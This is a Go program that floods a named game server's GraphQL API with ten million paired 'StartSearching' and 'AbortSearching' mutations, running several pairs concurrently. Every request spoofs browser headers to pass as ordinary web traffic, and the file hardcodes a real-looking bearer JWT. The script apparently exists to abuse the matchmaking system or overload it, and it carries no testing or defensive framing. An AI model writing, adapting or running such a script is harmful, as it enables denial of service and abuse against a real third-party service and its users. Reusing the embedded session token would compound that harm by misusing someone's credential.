package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

const (
	URL             = "https://server.matiks.com/api"
	TotalRequests   = 10000000
	ConcurrentBatch = 5
	AuthKey         = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Nzg4MDk4MDIsImlkIjoiNjgxZGI3OGY0ZWE2NmE0NjQ4YTNmOGU4In0.T4UDNVWQbMzkIZAv_BLY2-xuNZGVF2GfQ6u6GR5tPYE"
)

var startPayload = []byte(`{"operationName":"StartSearching","variables":{"gameConfig":{"numPlayers":2,"timeLimit":60,"gameType":"PLAY_ONLINE"}},"query":"mutation StartSearching($gameConfig: GameConfigInput) {\n  startSearching(gameConfig: $gameConfig)\n}"}`)
var abortPayload = []byte(`{"operationName":"AbortSearching","variables":{},"query":"mutation AbortSearching {\n  abortSearching\n}"}`)

var client = &http.Client{}

func doRequest(id int, name string, payload []byte, wg *sync.WaitGroup) {
	defer wg.Done()

	req, _ := http.NewRequest("POST", URL, bytes.NewBuffer(payload))
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.8")
	req.Header.Set("authorization", AuthKey)
	req.Header.Set("cache-control", "no-cache")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", "https://www.matiks.in")
	req.Header.Set("pragma", "no-cache")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", "https://www.matiks.in/")
	req.Header.Set("sec-ch-ua", `"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"macOS"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "cross-site")
	req.Header.Set("sec-fetch-storage-access", "none")
	req.Header.Set("sec-gpc", "1")
	req.Header.Set("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36")
	req.Header.Set("x-request-id", fmt.Sprintf("web_%d_%d", id, time.Now().UnixNano()))
	req.Header.Set("x-timezone", "Asia/Calcutta")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[%s] [%d] [%s] [ERROR] %v\n", time.Now().Format("2006-01-02 15:04:05.000"), id, name, err)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	fmt.Printf("[%s] [%d] [%s] [%s] %s\n", time.Now().Format("2006-01-02 15:04:05.000"), id, name, resp.Status, string(body))
}

func main() {
	for i := 0; i < TotalRequests; i += ConcurrentBatch {
		var wg sync.WaitGroup
		for j := 0; j < ConcurrentBatch && i+j < TotalRequests; j++ {
			idx := i + j
			wg.Add(1)
			go doRequest(idx, "StartSearching", startPayload, &wg)
			wg.Add(1)
			go doRequest(idx, "AbortSearching", abortPayload, &wg)
		}
		wg.Wait()
	}
}
